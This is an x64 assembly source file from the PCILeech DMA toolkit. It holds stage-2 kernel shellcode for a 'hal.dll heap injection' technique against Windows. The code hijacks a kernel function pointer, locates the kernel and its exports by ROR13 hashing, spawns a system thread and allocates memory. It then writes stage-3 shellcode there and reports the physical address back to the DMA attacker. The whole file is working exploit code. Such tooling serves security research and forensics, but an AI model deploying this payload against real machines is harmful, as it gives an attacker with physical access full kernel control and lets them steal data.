; wx64_stage2.asm : assembly modified for the hal.dll heap injection technique.
;
; (c) Ulf Frisk, 2016, 2017
; Author: Ulf Frisk, pcileech@frizk.net
;

.CODE

main PROC
	; ----------------------------------------------------
	; INITIAL OP AND VARIABLE MEMORY LOCATIONS
	; ----------------------------------------------------
	JMP main_start 
	data_cmpxchg_flag		db 00h
	data_filler				db 00h
	data_phys_addr_alloc	dd 00000000h						; 04h byte offset (4 bytes long)
	data_orig_fnptr			dq 0000000000000000h				; 08h byte offset (8 bytes long)
	data_orig_fnptraddr		dq 0000000000000000h				; 10h byte offset (8 bytes long)
	data_thread_handle		dq 0000000000000000h				; 18h byte offset (8 bytes long)
	; ----------------------------------------------------
	; SAVE ORIGINAL PARAMETERS
	; ----------------------------------------------------
	main_start:
	PUSH rcx
	PUSH rdx
	PUSH r8
	PUSH r9
	PUSH rbx
	PUSH rsi
	PUSH rdi
	PUSH r10
	PUSH r11
	PUSH r12
	PUSH r13
	SUB rsp, 020h
	; ----------------------------------------------------
	; r12 = ntos base address
	; r13 = PsCreateSystemThread address
	; ----------------------------------------------------
	; SET UP STACK AND PARAMETERS
	; param0 = address of NTOS code. First entry of
	; IDT table = division by zero points into NTOSKRNL
	; ----------------------------------------------------
	SIDT [rsp]
	MOV rcx, [rsp+2]       
	MOV rcx, [rcx+4]                ; param0
	; ----------------------------------------------------
	; FETCH NTOS BASE ADDRESS
	; ----------------------------------------------------
	CALL PEGetModuleFromAddress_ScanBack
	MOV r12, rax
	; ----------------------------------------------------
	; CHECK CURRENT IRQL - ONLY IRQL PASSIVE (0) ALLOWED
	; ----------------------------------------------------
	MOV rcx, r12
	MOV edx, 4d90adceh			; H_KeGetCurrentIrql
	CALL PEGetProcAddressH
	CALL rax
	TEST rax, rax
	JNZ skipcall
	; ----------------------------------------------------
	; ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	LOCK CMPXCHG [data_cmpxchg_flag], dl
	JNE skipcall
	; ----------------------------------------------------
	; REMOVE HOOK
	; ----------------------------------------------------
	MOV rax, [data_orig_fnptraddr]
	MOV rcx, [data_orig_fnptr]
	MOV [rax], rcx
	; ----------------------------------------------------
	; CREATE THREAD
	; ----------------------------------------------------
	MOV rcx, r12
	MOV edx, 94a06b02h			; H_PsCreateSystemThread
	CALL PEGetProcAddressH
	MOV r13, rax				; PsCreateSystemThread address
	PUSH 0						; (dummy for stack alignment)
	PUSH r12					; StartContext
	LEA rax, setup2
	PUSH rax					; StartRoutine
	PUSH 0						; ClientId
	SUB rsp, 020h				; (stack shadow space)
	XOR r9, r9					; ProcessHandle
	XOR r8, r8					; ObjectAttributes
	MOV rdx, 1fffffh			; DesiredAccess
	LEA rcx, data_thread_handle	; ThreadHandle
	CALL r13
	ADD rsp, 040h
	; ----------------------------------------------------
	; EXIT - RESTORE AND JMP BACK
	; ----------------------------------------------------
	skipcall:
	ADD rsp, 020h
	POP r13
	POP r12
	POP r11
	POP r10
	POP rdi
	POP rsi
	POP rbx
	POP r9
	POP r8
	POP rdx
	POP rcx
	MOV rax, [data_orig_fnptr]
	JMP rax
main ENDP

; ----------------------------------------------------
; New Thread entry point. Allocate memory, write pre-stage3 code and write back
; the physical address so PCILeech may read it with DMA.
; rcx -> virtual address base of kernel
; r12 :: virtual address base of kernel
; r13 :: virtual address buffer
; ----------------------------------------------------
setup2 PROC
	; ----------------------------------------------------
	; SET UP STACK SHADOW SPACE (REQUIRED FOR SOME FUNCTION CALLS)
	; ----------------------------------------------------
	PUSH rbp
	MOV rbp, rsp
	SUB rsp, 020h
	; ----------------------------------------------------
	; ALLOCATE 0x2000 CONTIGUOUS MEMORY BELOW 0x7fffffff
	; ----------------------------------------------------
	MOV r12, rcx
	MOV edx, 9f361ebch			; H_MmAllocateContiguousMemory
	CALL PEGetProcAddressH
	MOV rcx, 2000h
	MOV rdx, 7fffffffh
	CALL rax
	MOV r13, rax
	; ----------------------------------------------------
	; ZERO ALLOCATED MEMORY
	; ----------------------------------------------------
	XOR rax, rax
	MOV ecx, 400h
	clear_loop:
	DEC ecx
	MOV [r13+rcx*8], rax
	JNZ clear_loop
	; ----------------------------------------------------
	; SET UP INITIAL STAGE3 SHELLCODE AND DATA
	; ----------------------------------------------------
	MOV rax, r12
	MOV [r13+8], rax
	MOV rax, 048FFFFFFF1058D48h
	MOV [r13+1000h], rax
	MOV rax, 0F07400F88348008Bh
	MOV [r13+1008h], rax
	; ----------------------------------------------------
	; WRITE PHYSICAL MEMORY ADDRESS
	; ----------------------------------------------------
	MOV rcx, r12
	MOV edx, 5a326357h			; H_MmGetPhysicalAddress
	CALL PEGetProcAddressH	
	MOV rcx, r13
	CALL rax
	MOV [data_phys_addr_alloc], eax
	; ----------------------------------------------------
	; JMP INTO ALLOCATED AREA
	; ----------------------------------------------------
	MOV rsp, rbp
	POP rbp
	ADD r13, 1000h
	JMP r13
setup2 ENDP

; ----------------------------------------------------
; Perform ROR13 hashing
; rcx -> string ptr
; rax <- result
; ----------------------------------------------------
HashROR13A PROC
	PUSH rsi
	PUSH rdi
	MOV rsi, rcx
	XOR rdi, rdi
	XOR rax, rax
	CLD
	hash_loop:
	LODSB
	TEST al, al
	JZ hash_loop_finish
	ROR edi, 13
	ADD edi, eax
	JMP hash_loop
	hash_loop_finish:
	MOV eax, edi
	POP rdi
	POP rsi
	RET
HashROR13A ENDP

; ----------------------------------------------------
; Search for PE header given an address. May cause page faults.
; rcx -> scan address
; rax <- header address
; ----------------------------------------------------
PEGetModuleFromAddress_ScanBack PROC
	SHR rcx, 12
	SHL rcx, 12
	address_loop:
	MOV eax, 1000h
	SUB rcx, rax
	MOV ax, [rcx]		; dos header magic
	CMP ax, 5a4dh
	JNE address_loop
	MOV eax, [rcx+60]	; nt header address offset
	CMP eax, 1000h
	JNBE address_loop
	ADD rax, rcx		; nt header address
	MOV eax, [rax]
	CMP eax, 00004550h	; nt header magic
	JNE address_loop
	MOV rax, rcx
	RET
PEGetModuleFromAddress_ScanBack ENDP

; rcx -> module base address
; rdx -> hash of exported function
; rax <- address of exported function
PEGetProcAddressH PROC
	; rdi = PIMAGE_EXPORT_DIRECTORY
	; rsi = counter NumberOfNames
	PUSH rdi
	PUSH rsi
	MOV edi, [rcx+60]	; nt header address offset
	MOV edi, [rdi+rcx+136]
	ADD rdi, rcx		; ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + hModule  
	MOV r8d, [rdi+24]	; PIMAGE_EXPORT_DIRECTORY->NumberOfNames
	XOR rsi, rsi
	find_loop:
	MOV eax, [rdi+32]			; PIMAGE_EXPORT_DIRECTORY->AddressOfNames
	ADD rax, rcx				; PIMAGE_EXPORT_DIRECTORY->AddressOfNames + hModule
	MOV eax, [rax+rsi*4]		; AddressOfNames[index]
	ADD rax, rcx
	PUSH rcx
	MOV rcx, rax
	CALL HashROR13A
	POP rcx
	CMP eax, edx
	JE find_loop_found
	INC rsi
	JMP find_loop
	find_loop_found:
	; found!
	MOV edx, [rdi+36]		; PIMAGE_EXPORT_DIRECTORY->AddressOfNameOrdinals
	ADD rdx, rcx			; PIMAGE_EXPORT_DIRECTORY->AddressOfNameOrdinals + hModule
	XOR rax, rax
	MOV ax, [rdx+rsi*2]		; AddressOfNameOrdinals[index]
	MOV edx, [rdi+28]		; PIMAGE_EXPORT_DIRECTORY->AddressOfFunctions 
	ADD rdx, rcx			; PIMAGE_EXPORT_DIRECTORY->AddressOfFunctions + hModule
	MOV eax, [rdx+rax*4]	; AddressOfFunctions[index]
	ADD rax, rcx			; AddressOfFunctions[index] + hModule
	POP rsi
	POP rdi
	RET
PEGetProcAddressH ENDP

END
